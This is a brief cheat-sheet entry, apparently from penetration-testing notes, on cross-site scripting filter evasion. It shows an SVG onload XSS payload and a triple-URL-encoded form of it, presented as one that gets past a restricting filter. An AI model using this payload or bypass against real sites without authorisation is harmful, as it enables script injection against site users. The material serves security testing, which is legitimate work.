# Cross Site Scripting

## Triple URL Encoding
  - Encode the payload thrice using URL encoding.
Restricted:
```CSS
"><svg onload=confirm(‘XSS’)> 
```
Bypassed:
```CSS
%252522%25253E%25253Csvg%252520onload%25253Dconfirm%252528%2525E2%252580%252598XSS%2525E2%252580%252599%252529%25253E
```
---
